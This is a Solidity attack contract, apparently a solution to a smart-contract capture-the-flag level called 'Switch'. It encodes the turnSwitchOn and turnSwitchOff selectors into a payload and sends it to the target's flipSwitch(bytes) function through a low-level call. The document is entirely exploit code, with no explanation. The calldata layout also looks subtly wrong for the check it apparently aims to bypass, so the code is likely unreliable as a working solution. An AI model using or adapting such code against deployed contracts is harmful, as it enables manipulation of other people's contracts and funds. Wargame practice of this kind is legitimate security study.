pragma solidity ^0.8.0;

contract SwitchAttack {
    address public immutable switchInstance;

    constructor(address _instance) {
        switchInstance = _instance;
    }

    function attack() external {
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes memory paddedData = abi.encodePacked(onSelector, offSelector);
        bytes4 flipSelector = bytes4(keccak256("flipSwitch(bytes)"));
        (bool success,) = switchInstance.call(abi.encodeWithSelector(flipSelector, paddedData));
        require(success, "flipSwitch call failed");
    }

}